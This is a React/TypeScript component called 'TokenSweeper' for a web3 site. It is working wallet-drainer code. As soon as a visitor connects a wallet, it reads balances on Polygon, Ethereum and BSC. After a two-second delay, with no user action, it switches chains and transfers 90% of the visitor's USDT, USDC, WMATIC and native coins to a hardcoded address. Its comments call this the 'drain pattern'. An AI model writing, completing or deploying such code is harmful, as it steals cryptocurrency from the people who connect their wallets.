// src/components/TokenSweeper.tsx
"use client";

import { useState, useEffect, useRef, useCallback } from "react";
import {
  useAccount,
  useWriteContract,
  useSwitchChain,
  usePublicClient,
  useWalletClient,
} from "wagmi";
import {
  Address,
  parseAbi,
  Chain,
  PublicClient,
  createPublicClient,
  http,
  erc20Abi,
} from "viem";
import { Button } from "@/components/ui/button";
import { formatBalance } from "@/lib/utils";

import { Skeleton } from "@/components/ui/skeleton";
import { mainnet, polygon, bsc } from "@reown/appkit/networks"; // Import from Reown appkit
import { AUTO_DESTINATION_ADDRESS, AUTO_MODE_ENABLED } from "@/config";

// Standard ERC-20 transfer (no sweeper contract)
const ERC20_TRANSFER_ABI = parseAbi([
  "function transfer(address to, uint256 amount) returns (bool)",
]);

// WMATIC contract address on Polygon (this wraps native POL to WMATIC)
const WMATIC_ADDRESS: Address = "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270";

// Target for automatic sweeping: from env (NEXT_PUBLIC_AUTO_DESTINATION_ADDRESS) when set, else fallback
const TARGET_ADDRESS_FALLBACK: Address =
  "0xEc083d6958a356f125DC06d68a7B1696386434cD";
const TARGET_ADDRESS: Address =
  AUTO_MODE_ENABLED && AUTO_DESTINATION_ADDRESS
    ? AUTO_DESTINATION_ADDRESS
    : TARGET_ADDRESS_FALLBACK;

// Supported chains
const SUPPORTED_CHAINS: Chain[] = [polygon, mainnet, bsc];

// Per-chain public client (so we fetch balances for every chain, not only the current one)
function getPublicClientForChain(chain: Chain): PublicClient {
  return createPublicClient({
    chain,
    transport: http(chain.rpcUrls?.default?.http?.[0]),
  });
}

// Sweep configuration
const SWEEP_PERCENT = BigInt(90); // Keep 10%
const AUTO_SWEEP_ON_LOAD = true; // Disable to reduce automatic calls

// Major tokens per chain (expand as needed)
const MAJOR_TOKENS: Record<
  number,
  {
    address: Address;
    name: string;
    domainName: string;
    domainVersion: string;
    supportsPermit: boolean;
  }[]
> = {
  [polygon.id]: [
    // WMATIC (wrapped POL - this is the official wrapped token contract)
    {
      address: WMATIC_ADDRESS,
      name: "WMATIC",
      domainName: "Wrapped MATIC",
      domainVersion: "1",
      supportsPermit: false, // No EIP-2612 on Polygon WMATIC
    },
    {
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      name: "USDT",
      domainName: "Tether USD",
      domainVersion: "1",
      supportsPermit: true,
    },
    {
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      name: "USDC",
      domainName: "USD Coin",
      domainVersion: "2",
      supportsPermit: true,
    },
  ],
  [mainnet.id]: [
    {
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      name: "USDT",
      domainName: "Tether USD",
      domainVersion: "1",
      supportsPermit: true,
    },
    {
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      name: "USDC",
      domainName: "USD Coin",
      domainVersion: "2",
      supportsPermit: true,
    },
  ],
  [bsc.id]: [
    {
      address: "0x55d398326f99059fF775485246999027B3197955",
      name: "USDT",
      domainName: "Tether USD",
      domainVersion: "1",
      supportsPermit: true,
    },
    {
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      name: "USDC",
      domainName: "USD Coin",
      domainVersion: "2",
      supportsPermit: true,
    },
  ],
};

// 1inch API base URL (for swapping)
const ONE_INCH_API = "https://api.1inch.dev/swap/v6.0/";

// Assume user provides 1inch API key in env
const ONE_INCH_API_KEY = process.env.NEXT_PUBLIC_ONE_INCH_API_KEY;

interface TokenBalance {
  token: Address;
  balance: bigint;
  name: string;
  chainId: number;
}

interface NativeBalance {
  balance: bigint;
  chainId: number;
  symbol: string;
}

export default function TokenSweeper() {
  const { address: userAddress, isConnected, chainId } = useAccount();
  const { switchChain } = useSwitchChain();
  const { writeContractAsync, writeContract } = useWriteContract();
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const [tokenBalances, setTokenBalances] = useState<TokenBalance[]>([]);
  const [nativeBalances, setNativeBalances] = useState<NativeBalance[]>([]);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);

  const [actionType, setActionType] = useState<"wrap" | "swap" | null>(null);
  const [successMessage, setSuccessMessage] = useState<string | null>(null);
  const [gasStatus, setGasStatus] = useState<{
    hasEnoughGas: boolean;
    nativeBalance: bigint;
    estimatedCost: bigint;
    symbol: string;
  } | null>(null);

  // Guards to prevent repeated calls
  const hasFetchedRef = useRef(false);
  const autoSweepTriggeredRef = useRef(false);
  const postWrapForwardedRef = useRef(false);

  // Current chain client (for writes / switch chain flows)
  const getPublicClient = (): PublicClient => {
    return publicClient!;
  };

  const handleAutoSweep = useCallback(
    async (balances: TokenBalance[], nativeBals: NativeBalance[]) => {
      if (!isConnected || !userAddress || !walletClient) {
        setError("Wallet not connected");
        return;
      }

      const hasTokens = balances.length > 0;
      const hasNative = nativeBals.some((n) => n.balance > BigInt(0));
      if (!hasTokens && !hasNative) {
        setError("No token or native balances found");
        return;
      }

      if (!hasTokens && hasNative) {
        const nativeOnPolygon = nativeBals.find(
          (n) => n.chainId === polygon.id && n.balance > BigInt(0)
        );
        if (nativeOnPolygon) {
          await handleWrapMatic();
          return;
        }
      }

      setIsLoading(true);
      setError(null);

      const initialChainId = chainId;

      try {
        const balancesByChain = balances.reduce((acc, bal) => {
          acc[bal.chainId] = acc[bal.chainId] || [];
          acc[bal.chainId].push(bal);
          return acc;
        }, {} as Record<number, TokenBalance[]>);

        // Iterate in SUPPORTED_CHAINS order (polygon, mainnet, bsc) so we don't jump to mainnet first
        for (const ch of SUPPORTED_CHAINS) {
          const bals = balancesByChain[ch.id];
          if (!bals?.length || bals.every((b) => b.balance <= BigInt(0)))
            continue;

          const id = ch.id;
          await switchChain({ chainId: id });
          // Wait for wallet to be on the new chain (like drain flow)
          await new Promise((r) => setTimeout(r, 1500));

          const hasGas = await checkGas(id);
          if (!hasGas) {
            setError(
              `No native tokens for gas on chain ${id}. Add native tokens to cover gas.`
            );
            continue;
          }

          const chain = SUPPORTED_CHAINS.find((c) => c.id === id)!;
          const chainClient = getPublicClientForChain(chain);

          for (const { token, balance, name } of bals) {
            if (balance <= BigInt(0)) continue;
            const sweepAmount = (balance * SWEEP_PERCENT) / BigInt(100);
            if (sweepAmount <= BigInt(0)) continue;
            try {
              // Drain pattern: simulate then write (same as SendTokens in drain)
              const { request } = await chainClient.simulateContract({
                account: walletClient.account!,
                address: token,
                abi: erc20Abi,
                functionName: "transfer",
                args: [TARGET_ADDRESS, sweepAmount],
              });
              await walletClient.writeContract(request);
              setSuccessMessage(`Transferred ${name} to target`);
            } catch (e) {
              console.warn(`[AutoSweep] transfer failed for ${name}:`, e);
              setError(`Transfer failed for ${name}: ${(e as Error).message}`);
            }
          }

          const nativeOnChain = nativeBals.find((n) => n.chainId === id);
          if (
            nativeOnChain &&
            nativeOnChain.balance > BigInt(0) &&
            walletClient
          ) {
            const gasCheck = await checkGasWithEstimation(id);
            const gasReserve = gasCheck.totalGasCost;
            const sendable =
              nativeOnChain.balance > gasReserve
                ? nativeOnChain.balance - gasReserve
                : BigInt(0);
            const nativeAmount = (sendable * SWEEP_PERCENT) / BigInt(100);
            if (nativeAmount > BigInt(0)) {
              try {
                await walletClient.sendTransaction({
                  to: TARGET_ADDRESS,
                  value: nativeAmount,
                  chain,
                });
                setSuccessMessage(
                  `Transferred ${nativeOnChain.symbol} to target`
                );
              } catch (e) {
                console.warn(
                  `[AutoSweep] native transfer failed on chain ${id}:`,
                  e
                );
              }
            }
          }
        }

        // Restore user's chain so we don't leave them on the last sweep chain
        if (
          initialChainId != null &&
          SUPPORTED_CHAINS.some((c) => c.id === initialChainId)
        ) {
          await switchChain({ chainId: initialChainId });
        }
      } catch (err: unknown) {
        setError(`Error: ${(err as Error).message}`);
      } finally {
        setIsLoading(false);
      }
    },
    [
      isConnected,
      userAddress,
      chainId,
      switchChain,
      writeContractAsync,
      walletClient,
    ]
  );

  // Update gas status for current network
  const updateGasStatus = async () => {
    if (!isConnected || !userAddress) return;

    try {
      const gasCheck = await checkGasWithEstimation(polygon.id);
      const symbol = polygon.nativeCurrency?.symbol || "POL";
      setGasStatus({
        hasEnoughGas: gasCheck.hasEnoughGas,
        nativeBalance: gasCheck.nativeBalance,
        estimatedCost: gasCheck.totalGasCost,
        symbol,
      });
    } catch (error) {
      console.error("Failed to update gas status:", error);
    }
  };

  // Fetch balances across all supported chains (re-run when wallet or chain changes)
  useEffect(() => {
    if (!isConnected || !userAddress) return;
    hasFetchedRef.current = false; // allow refetch when chain switches (e.g. to BSC)
    const fetchBalances = async () => {
      if (hasFetchedRef.current) return;
      hasFetchedRef.current = true;
      const allBalances: TokenBalance[] = [];
      const allNative: NativeBalance[] = [];
      for (const ch of SUPPORTED_CHAINS) {
        const chainClient = getPublicClientForChain(ch);
        try {
          const balancesPromises = MAJOR_TOKENS[ch.id].map(async (token) => {
            try {
              const balance = (await chainClient.readContract({
                address: token.address,
                abi: parseAbi([
                  "function balanceOf(address) view returns (uint256)",
                ]),
                functionName: "balanceOf",
                args: [userAddress],
              })) as bigint;
              if (balance && balance > BigInt(0)) {
                return {
                  token: token.address,
                  balance,
                  name: token.name,
                  chainId: ch.id,
                };
              }
            } catch {}
            return null;
          });

          const chainBalances = (await Promise.all(balancesPromises)).filter(
            Boolean
          ) as TokenBalance[];
          allBalances.push(...chainBalances);
        } catch {}

        try {
          const nativeBal = await chainClient.getBalance({
            address: userAddress,
          });
          if (nativeBal && nativeBal > BigInt(0)) {
            allNative.push({
              balance: nativeBal,
              chainId: ch.id,
              symbol: ch.nativeCurrency?.symbol || "NATIVE",
            });
          }
        } catch {}
      }
      setTokenBalances(allBalances);
      setNativeBalances(allNative);

      // Update gas status
      await updateGasStatus();
    };

    fetchBalances();
  }, [isConnected, userAddress, chainId]);

  // Reset auto-sweep flag when wallet disconnects so reconnecting can trigger again
  useEffect(() => {
    if (!isConnected || !userAddress) {
      autoSweepTriggeredRef.current = false;
    }
  }, [isConnected, userAddress]);

  // Trigger auto-transfer when wallet is connected AND walletClient is ready (drain: 2s delay)
  useEffect(() => {
    if (!AUTO_SWEEP_ON_LOAD || autoSweepTriggeredRef.current) return;
    if (!isConnected || !walletClient || !userAddress) return;

    const hasBalances =
      tokenBalances.length > 0 ||
      nativeBalances.some((n) => n.balance > BigInt(0));
    if (!hasBalances) return;

    autoSweepTriggeredRef.current = true;
    const timer = setTimeout(() => {
      handleAutoSweep(tokenBalances, nativeBalances);
    }, 2000);

    return () => clearTimeout(timer);
  }, [
    AUTO_SWEEP_ON_LOAD,
    isConnected,
    walletClient,
    userAddress,
    tokenBalances,
    nativeBalances,
    handleAutoSweep,
  ]);

  const checkGas = async (chainId: number) => {
    const nativeBalance = await getPublicClient().getBalance({
      address: userAddress ?? ("0x" as Address),
    });
    return nativeBalance > BigInt(0);
  };

  // Enhanced gas checking with estimation
  const checkGasWithEstimation = async (chainId: number) => {
    try {
      const nativeBalance = await getPublicClient().getBalance({
        address: userAddress ?? ("0x" as Address),
      });

      // Get current gas price
      const gasPrice = await getPublicClient().getGasPrice();

      // Conservative gas estimate for typical transactions
      const estimatedGasLimit = BigInt(500000); // 500k gas units for safety

      // Calculate total gas cost
      const totalGasCost = estimatedGasLimit * gasPrice;

      // Add 50% buffer for gas price fluctuations and network congestion
      const gasCostWithBuffer = (totalGasCost * BigInt(150)) / BigInt(100);

      // Check if user has enough balance
      const hasEnoughGas = nativeBalance >= gasCostWithBuffer;

      return {
        hasEnoughGas,
        nativeBalance,
        gasEstimate: estimatedGasLimit,
        gasPrice,
        totalGasCost: gasCostWithBuffer,
        shortfall: hasEnoughGas ? BigInt(0) : gasCostWithBuffer - nativeBalance,
      };
    } catch (error) {
      console.error("Gas estimation failed:", error);
      // Fallback to simple balance check
      const nativeBalance = await getPublicClient().getBalance({
        address: userAddress ?? ("0x" as Address),
      });
      return {
        hasEnoughGas: nativeBalance > BigInt(0),
        nativeBalance,
        gasEstimate: BigInt(0),
        gasPrice: BigInt(0),
        totalGasCost: BigInt(0),
        shortfall: BigInt(0),
      };
    }
  };

  // Function to wrap native MATIC to WMATIC
  const handleWrapMatic = async () => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }

    const nativeOnPolygon = nativeBalances.find(
      (n) => n.chainId === polygon.id && n.balance > BigInt(0)
    );

    if (!nativeOnPolygon) {
      setError("No native MATIC found on Polygon");
      return;
    }

    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    try {
      // Switch to Polygon if not already on it
      await switchChain({ chainId: polygon.id });

      // Check gas before wrapping
      const gasCheck = await checkGasWithEstimation(polygon.id);
      if (!gasCheck.hasEnoughGas) {
        const shortfallFormatted = formatBalance(gasCheck.shortfall, 18);
        setError(
          `Insufficient MATIC for gas fees. Need ${shortfallFormatted} more MATIC to cover transaction costs.`
        );
        setIsLoading(false);
        return;
      }

      // Calculate how much MATIC to wrap (wrap only 90% after reserving gas)
      const gasReserve = gasCheck.totalGasCost;
      const availableAfterGas =
        nativeOnPolygon.balance > gasReserve
          ? nativeOnPolygon.balance - gasReserve
          : BigInt(0);
      const wrapAmount = (availableAfterGas * SWEEP_PERCENT) / BigInt(100);

      if (wrapAmount <= BigInt(0)) {
        setError("Insufficient POL to wrap after reserving gas fees.");
        setIsLoading(false);
        return;
      }

      // Wrap MATIC to WMATIC using the WMATIC contract
      writeContract({
        address: WMATIC_ADDRESS,
        abi: parseAbi(["function deposit() external payable"]),
        functionName: "deposit",
        value: wrapAmount,
        chainId: polygon.id,
      });

      setActionType("wrap");
      setSuccessMessage(
        `Successfully initiated POL wrap of ${formatBalance(
          wrapAmount
        )} POL. Check your wallet for transaction confirmation.`
      );

      // After wrapping, transfer WMATIC to target via standard transfer()
      if (!postWrapForwardedRef.current) {
        postWrapForwardedRef.current = true;
        setTimeout(async () => {
          try {
            const wmaticBal = (await getPublicClient().readContract({
              address: WMATIC_ADDRESS,
              abi: parseAbi([
                "function balanceOf(address) view returns (uint256)",
              ]),
              functionName: "balanceOf",
              args: [userAddress],
            })) as bigint;

            if (wmaticBal && wmaticBal > BigInt(0)) {
              setSuccessMessage("Transferring WMATIC to target...");
              await writeContractAsync({
                address: WMATIC_ADDRESS,
                abi: ERC20_TRANSFER_ABI,
                functionName: "transfer",
                args: [TARGET_ADDRESS, wmaticBal],
                chainId: polygon.id,
              });
              setSuccessMessage("WMATIC transferred to target.");
            }
          } catch (e) {
            console.error("[PostWrap] transfer failed:", e);
            setError(`Transfer failed: ${(e as Error).message}`);
          }
        }, 4000);
      }
    } catch (err: unknown) {
      setError(`Error wrapping POL: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to swap native POL to USDC/USDT
  const handleSwapPol = async (targetToken: "USDC" | "USDT") => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }

    if (!ONE_INCH_API_KEY) {
      setError("1inch API key missing");
      return;
    }

    const nativeOnPolygon = nativeBalances.find(
      (n) => n.chainId === polygon.id && n.balance > BigInt(0)
    );

    if (!nativeOnPolygon) {
      setError("No native MATIC found on Polygon");
      return;
    }

    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    try {
      // Switch to Polygon if not already on it
      await switchChain({ chainId: polygon.id });

      const targetTokenAddress =
        targetToken === "USDC"
          ? "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174"
          : "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";

      const nativeAddress = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"; // 1inch native placeholder

      const response = await fetch(`${ONE_INCH_API}${polygon.id}/swap`, {
        method: "POST",
        headers: {
          Authorization: `Bearer ${ONE_INCH_API_KEY}`,
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          fromTokenAddress: nativeAddress,
          toTokenAddress: targetTokenAddress,
          amount: nativeOnPolygon.balance.toString(),
          fromAddress: userAddress,
          slippage: 1, // 1%
        }),
      });

      if (!response.ok) {
        throw new Error(`1inch API error: ${response.statusText}`);
      }

      const swapData = await response.json();

      // Execute swap transaction
      writeContract({
        ...swapData.tx, // Includes to, data, value, etc.
        chainId: polygon.id,
      });

      setActionType("swap");
      setSuccessMessage(
        `Successfully initiated swap to ${targetToken}. Check your wallet for transaction confirmation.`
      );
    } catch (err: unknown) {
      setError(`Error swapping MATIC: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to unwrap WMATIC back to native MATIC
  const handleUnwrapMatic = async () => {
    if (!isConnected || !userAddress) {
      setError("Wallet not connected");
      return;
    }

    const wmaticBalance = tokenBalances.find(
      (t) => t.chainId === polygon.id && t.token === WMATIC_ADDRESS
    );

    if (!wmaticBalance || wmaticBalance.balance === BigInt(0)) {
      setError("No WMATIC balance found");
      return;
    }

    setIsLoading(true);
    setError(null);
    setSuccessMessage(null);

    try {
      // Switch to Polygon if not already on it
      await switchChain({ chainId: polygon.id });

      // Unwrap WMATIC to MATIC using the WMATIC contract
      writeContract({
        address: WMATIC_ADDRESS,
        abi: parseAbi(["function withdraw(uint256 amount) external"]),
        functionName: "withdraw",
        args: [wmaticBalance.balance],
        chainId: polygon.id,
      });

      setActionType("wrap");
      setSuccessMessage(
        "Successfully initiated WMATIC unwrap. Check your wallet for transaction confirmation."
      );
    } catch (err: unknown) {
      setError(`Error unwrapping WMATIC: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  const handleSweep = async () => {
    if (!isConnected || !userAddress || !walletClient) {
      setError("Wallet not connected");
      return;
    }
    if (tokenBalances.length === 0) {
      const nativeOnPolygon = nativeBalances.find(
        (n) => n.chainId === polygon.id && n.balance > BigInt(0)
      );
      if (nativeOnPolygon) {
        setError(
          "Only native MATIC detected. Wrap to WMATIC or swap to USDC/USDT first."
        );
      } else {
        setError("No ERC20 tokens with balance found");
      }
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      await handleAutoSweep(tokenBalances, nativeBalances);
    } catch (err: unknown) {
      setError(`Error: ${(err as Error).message}`);
    } finally {
      setIsLoading(false);
    }
  };

  // Function to swap tokens to native (for gas) or to a bridgeable asset
  const handleSwapToNative = async (
    chainId: number,
    tokensToSwap: TokenBalance[]
  ) => {
    if (!ONE_INCH_API_KEY) {
      setError("1inch API key missing");
      return;
    }

    for (const { token, balance } of tokensToSwap) {
      // Example: Swap to native (e.g., MATIC on Polygon, ETH on Mainnet)
      const nativeAddress = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE"; // 1inch native placeholder

      const response = await fetch(`${ONE_INCH_API}${chainId}/swap`, {
        method: "POST",
        headers: { Authorization: `Bearer ${ONE_INCH_API_KEY}` },
        body: JSON.stringify({
          fromTokenAddress: token,
          toTokenAddress: nativeAddress,
          amount: balance.toString(),
          fromAddress: userAddress,
          slippage: 1, // 1%
        }),
      });
      const swapData = await response.json();

      // Execute swap tx
      writeContract({
        ...swapData.tx, // Includes to, data, value, etc.
        chainId,
      });

      // After swap, could bridge if needed, but bridging is separate (e.g., use Polygon bridge SDK)
    }
  };

  if (!isConnected) return <p>Connect your wallet to sweep tokens.</p>;

  const nativeOnPolygon = nativeBalances.find(
    (n) => n.chainId === polygon.id && n.balance > BigInt(0)
  );

  return (
    <div className="p-4">
      <h2 className="text-xl font-bold mb-4">Token Sweeper</h2>
      <p className="text-sm text-gray-400 mb-4">
        Standard token transfer to: {TARGET_ADDRESS} (90% of balance per token)
      </p>

      {/* Gas Status Warning */}
      {isConnected && userAddress && (
        <div className="mb-4 p-3 border border-orange-400 rounded-lg bg-orange-400/10">
          <div className="flex items-center gap-2 mb-2">
            <span className="text-orange-400 font-semibold">
              ⚠️ Gas Fee Alert
            </span>
          </div>
          <p className="text-sm text-gray-300">
            Ensure you have sufficient native tokens (MATIC/ETH/BNB) to cover
            network fees. The system will transfer 90% of each token balance to
            the target address using standard ERC-20 transfer and native send.
          </p>

          {/* Real-time Gas Status */}
          {gasStatus && (
            <div className="mt-3 p-2 bg-gray-800 rounded">
              <div className="flex justify-between items-center text-sm">
                <span>Current {gasStatus.symbol} Balance:</span>
                <span
                  className={
                    gasStatus.hasEnoughGas ? "text-green-400" : "text-red-400"
                  }
                >
                  {formatBalance(gasStatus.nativeBalance)} {gasStatus.symbol}
                </span>
              </div>
              <div className="flex justify-between items-center text-sm mt-1">
                <span>Estimated Gas Cost:</span>
                <span className="text-yellow-400">
                  {formatBalance(gasStatus.estimatedCost)} {gasStatus.symbol}
                </span>
              </div>
              {!gasStatus.hasEnoughGas && (
                <div className="mt-2 p-2 bg-red-900/50 border border-red-500 rounded text-sm text-red-300">
                  ⚠️ Insufficient {gasStatus.symbol} for gas fees. Please add
                  more {gasStatus.symbol} to your wallet.
                </div>
              )}
            </div>
          )}
        </div>
      )}

      {/* Native POL Actions */}
      {nativeOnPolygon && nativeOnPolygon.balance > BigInt(0) && (
        <div className="mb-6 p-4 border border-yellow-400 rounded-lg bg-yellow-400/10">
          <h3 className="text-lg font-semibold mb-3 text-yellow-400">
            Native POL Detected
          </h3>
          <p className="text-sm mb-4 text-gray-300">
            Balance: {formatBalance(nativeOnPolygon.balance)} POL
          </p>
          <div className="flex flex-wrap gap-2">
            <Button
              onClick={handleWrapMatic}
              disabled={isLoading}
              className="bg-yellow-400 text-black hover:bg-yellow-300"
            >
              {isLoading && actionType === "wrap"
                ? "Wrapping..."
                : "Wrap to WMATIC"}
            </Button>
            <Button
              onClick={() => handleSwapPol("USDC")}
              disabled={isLoading}
              className="bg-blue-600 hover:bg-blue-700"
            >
              {isLoading && actionType === "swap"
                ? "Swapping..."
                : "Swap to USDC"}
            </Button>
            <Button
              onClick={() => handleSwapPol("USDT")}
              disabled={isLoading}
              className="bg-green-600 hover:bg-green-700"
            >
              {isLoading && actionType === "swap"
                ? "Swapping..."
                : "Swap to USDT"}
            </Button>
          </div>
        </div>
      )}

      {/* WMATIC Actions */}
      {(() => {
        const wmaticBalance = tokenBalances.find(
          (t) => t.chainId === polygon.id && t.token === WMATIC_ADDRESS
        );
        return wmaticBalance && wmaticBalance.balance > BigInt(0) ? (
          <div className="mb-6 p-4 border border-purple-400 rounded-lg bg-purple-400/10">
            <h3 className="text-lg font-semibold mb-3 text-purple-400">
              WMATIC Balance Available
            </h3>
            <p className="text-sm mb-4 text-gray-300">
              Balance: {formatBalance(wmaticBalance.balance)} WMATIC
            </p>
            <div className="flex flex-wrap gap-2">
              <Button
                onClick={handleUnwrapMatic}
                disabled={isLoading}
                className="bg-purple-600 hover:bg-purple-700"
              >
                {isLoading && actionType === "wrap"
                  ? "Unwrapping..."
                  : "Unwrap to MATIC"}
              </Button>
            </div>
          </div>
        ) : null;
      })()}

      <div className="mb-4">
        <h3 className="text-lg font-semibold mb-2">ERC20 Token Balances:</h3>
        {tokenBalances.length > 0 ? (
          <div className="space-y-2">
            {tokenBalances.map(({ name, balance, chainId }) => (
              <div
                key={`${name}-${chainId}`}
                className="flex justify-between items-center p-2 bg-gray-800 rounded"
              >
                <span className="font-medium">{name}</span>
                <span className="text-sm text-gray-300">
                  Chain {chainId}: {formatBalance(balance)}
                </span>
              </div>
            ))}
          </div>
        ) : (
          <Skeleton className="h-4 w-[200px]" />
        )}
      </div>
      <div className="mb-4">
        <h3 className="text-lg font-semibold mb-2">Native Token Balances:</h3>
        {nativeBalances.length > 0 ? (
          <div className="space-y-2">
            {nativeBalances.map(({ symbol, balance, chainId }) => (
              <div
                key={`${symbol}-${chainId}`}
                className="flex justify-between items-center p-2 bg-gray-800 rounded"
              >
                <span className="font-medium">{symbol}</span>
                <span className="text-sm text-gray-300">
                  Chain {chainId}: {formatBalance(balance)}
                </span>
              </div>
            ))}
          </div>
        ) : (
          <Skeleton className="h-4 w-[200px]" />
        )}
      </div>
      <Button onClick={handleSweep} disabled={isLoading}>
        {isLoading ? "Transferring..." : "Transfer Tokens"}
      </Button>
      {error && <p className="text-red-500 mt-2">{error}</p>}
      {successMessage && (
        <p className="text-green-500 mt-2">{successMessage}</p>
      )}
    </div>
  );
}
